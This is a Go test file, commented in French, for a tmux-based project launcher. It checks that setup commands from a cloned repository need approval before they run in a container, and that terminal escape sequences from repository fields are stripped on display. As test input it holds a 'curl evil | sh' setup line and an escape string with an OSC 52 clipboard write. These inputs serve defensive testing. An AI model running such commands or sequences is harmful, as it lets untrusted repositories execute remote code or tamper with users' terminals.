package tmux

// #215 (amendement audit) : garde d'approbation de la coque — à l'ouverture (openSelectedAs), après réponse, « Revoir »
// (F2) et échappement des champs du dépôt. Complète envtrust215_test.go (écran seul). tmux isolé (isoInner) ; registre
// trust.json dans le CL_CONFIG_DIR du test ; backend podman déclaré mais jamais appelé (la garde s'arrête avant).

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"claude-launcher-ng2/core"
)

const guardEnv215 = "image: debian:12\nsetup:\n  - touch /tmp/PREUVE-ENV-215\nmounts:\n  - path: /tmp\n    ro: false\n"

// guardModel215 : un projet cloné (environnement du dépôt, entrée pending) affecté à backend, sélectionné dans l'arbre,
// coque en mode lancement.
func guardModel215(t *testing.T, backend string) (model, string) {
	t.Helper()
	isoInner(t)
	cfg := t.TempDir()
	t.Setenv("CL_CONFIG_DIR", cfg)
	if err := os.WriteFile(filepath.Join(cfg, "backends.yaml"), []byte("backends:\n  pod: {type: podman}\ndefaults: {backend: pod}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	d := filepath.Join(t.TempDir(), "depot")
	_ = os.MkdirAll(filepath.Join(d, ".git"), 0o755)
	_ = os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755)
	if err := os.WriteFile(core.EnvPath(d), []byte(guardEnv215), 0o644); err != nil {
		t.Fatal(err)
	}
	if ok, err := core.MarkEnvPending(d, "https://github.com/a/depot.git", "debian:12"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	if err := core.WriteAssignment(d, backend); err != nil {
		t.Fatal(err)
	}
	n := core.Node{Name: "depot", Key: "depot", Path: d, Project: true}
	m := model{cfg: core.Config{Roots: []string{filepath.Dir(d)}}, nodes: []core.Node{n}, visible: []int{0}, launch: true,
		windows: map[string]bool{}, git: map[string]core.GitInfo{}, tpl: map[string]core.TemplateState{},
		detail: map[string]core.GitDetail{}, asked: map[string]bool{}}
	return m, d
}

func TestGardeALOuvertureEnConteneur215(t *testing.T) {
	m, d := guardModel215(t, "pod")
	m = m.openSelected()
	if m.form.mode != formTrust || m.form.trust == nil || m.form.trustPath != d {
		t.Fatalf("mode=%v : l'ouverture d'un projet cloné non approuvé en conteneur doit poser la question", m.form.mode)
	}
	if m.form.trust.Risk.Exec != 1 || m.form.trust.Risk.HostMounts != 1 {
		t.Errorf("risque = %+v, attendu 1 commande et 1 montage hors projet", m.form.trust.Risk)
	}
	if dtmux("has-session", "-t", exactS(hubSession)).Run() == nil {
		t.Error("une session tmux existe : quelque chose a été démarré avant l'accord")
	}
	if _, err := os.Stat("/tmp/PREUVE-ENV-215"); err == nil {
		_ = os.Remove("/tmp/PREUVE-ENV-215")
		t.Error("setup du dépôt exécuté sans accord")
	}
	// annuler : rien n'est écrit ni ouvert, la question reviendra
	nm, _ := m.onFormKey(key("esc"))
	m2 := nm.(model)
	if m2.form.mode != formNone || m2.windows["depot"] || core.EnvTrust(d) != core.TrustPending {
		t.Errorf("annuler : mode=%v windows=%v état=%s", m2.form.mode, m2.windows, core.EnvTrust(d))
	}
	if m3 := m2.openSelected(); m3.form.mode != formTrust {
		t.Error("la question ne revient pas après annulation")
	}
}

func TestGardeEstAbsentSurHoteEtProjetDeConfiance215(t *testing.T) {
	// affecté à l'hôte : aucune question (env.yaml inutilisé)
	m, d := guardModel215(t, "host")
	m = m.openSelected()
	if m.form.mode == formTrust {
		t.Error("question posée pour un projet sur l'hôte")
	}
	if core.EnvTrust(d) != core.TrustPending {
		t.Errorf("état = %s, attendu pending conservé (la question viendra en conteneur)", core.EnvTrust(d))
	}
	// projet de confiance (aucune entrée), même affecté à un conteneur : aucune question
	m2, d2 := guardModel215(t, "pod")
	setNoEntry := filepath.Join(os.Getenv("CL_CONFIG_DIR"), "trust.json")
	_ = os.Remove(setNoEntry)
	if core.EnvTrust(d2) != core.TrustTrusted {
		t.Fatalf("préparation : %s", core.EnvTrust(d2))
	}
	if m2 = m2.openSelected(); m2.form.mode == formTrust {
		t.Error("question posée pour un projet de confiance")
	}
}

func TestReponseReprendLOuverture215(t *testing.T) {
	for key_, want := range map[string]core.TrustState{"a": core.TrustAccepted, "s": core.TrustIgnored} {
		m, d := guardModel215(t, "pod")
		m = m.openSelected()
		nm, _ := m.onFormKey(key(key_))
		m2 := nm.(model)
		if core.EnvTrust(d) != want || m2.form.mode == formTrust {
			t.Errorf("touche %q : état=%s mode=%v, attendu %s et écran refermé", key_, core.EnvTrust(d), m2.form.mode, want)
		}
		// l'ouverture a repris (le hub n'existe pas ici : message, mais plus de question)
		if m2.msg == "" {
			t.Errorf("touche %q : aucune suite d'ouverture (message vide)", key_)
		}
		// choix définitif : le dépôt change (git pull), plus de question
		_ = os.WriteFile(core.EnvPath(d), []byte("image: debian:12\nsetup:\n  - curl evil | sh\n"), 0o644)
		m2.msg = ""
		if m3 := m2.openSelected(); m3.form.mode == formTrust {
			t.Errorf("touche %q : nouvelle question après un pull (choix définitif)", key_)
		}
		if core.EnvTrust(d) != want {
			t.Errorf("touche %q : état %s après pull", key_, core.EnvTrust(d))
		}
	}
}

func TestRevoirDepuisF2215(t *testing.T) {
	m, d := guardModel215(t, "pod")
	info, _ := core.EnvTrustInfoFor(d)
	if _, err := core.AnswerEnvTrust(d, "accept", info.SHA); err != nil {
		t.Fatal(err)
	}
	m = m.startExecChoice(core.Node{Name: "depot", Path: d, Project: true}, false)
	if m.form.mode != formExec || m.form.existing != d {
		t.Fatalf("F2 : mode=%v existing=%q", m.form.mode, m.form.existing)
	}
	nm, _ := m.onFormKey(key("r"))
	m2 := nm.(model)
	if core.EnvTrust(d) != core.TrustPending || m2.form.mode != formNone || !strings.Contains(m2.msg, "redemandé") {
		t.Errorf("Revoir : état=%s mode=%v msg=%q", core.EnvTrust(d), m2.form.mode, m2.msg)
	}
	// la question revient à l'ouverture suivante
	m2.windows = map[string]bool{}
	if m3 := m2.openSelected(); m3.form.mode != formTrust {
		t.Error("la question ne revient pas après « Revoir »")
	}
	// projet de confiance : « r » ne fait rien (erreur affichée, aucune entrée créée)
	m4, d4 := guardModel215(t, "pod")
	_ = os.Remove(filepath.Join(os.Getenv("CL_CONFIG_DIR"), "trust.json"))
	m4 = m4.startExecChoice(core.Node{Name: "depot", Path: d4, Project: true}, false)
	nm, _ = m4.onFormKey(key("r"))
	if core.EnvTrust(d4) != core.TrustTrusted || nm.(model).form.err == "" {
		t.Errorf("Revoir d'un projet de confiance : état=%s err=%q", core.EnvTrust(d4), nm.(model).form.err)
	}
}

// Chaque champ venu du dépôt est rendu sans séquence de terminal : image, paquets, setup, on_start, montages, source,
// nom du projet, image choisie.
func TestRenduSansSequencesTousLesChamps215(t *testing.T) {
	m, _ := guardModel215(t, "pod")
	m = m.openSelected()
	bad := "\x1b[2J\x1b]52;c;ZXZpbA==\x07\x9b31m"
	tr := m.form.trust
	tr.Source, tr.ChosenImage = "https://x/"+bad, "img"+bad
	tr.Spec.Image = "debian" + bad
	tr.Spec.Packages = []string{"jq" + bad}
	tr.Spec.Setup = []string{"a" + bad}
	tr.Spec.OnStart = []string{"b" + bad}
	tr.Spec.Mounts = []core.EnvTrustMount{{Path: "/m" + bad, RO: false}}
	m.form.name = "nom" + bad
	for _, raw := range []bool{false, true} {
		m.form.trustRaw = raw
		tr.Files = map[string]string{"env.yaml": "x" + bad, "env-template.yaml": "y" + bad}
		out := m.renderTrust(100)
		// seules les séquences de style de la coque (CSI « m ») sont admises ; aucune séquence du dépôt
		for _, seq := range []string{"\x1b[2J", "\x1b]52", "\x07", "\u009b31m"} {
			if strings.Contains(out, seq) {
				t.Errorf("raw=%v : séquence du dépôt %q dans le rendu", raw, seq)
			}
		}
	}
}
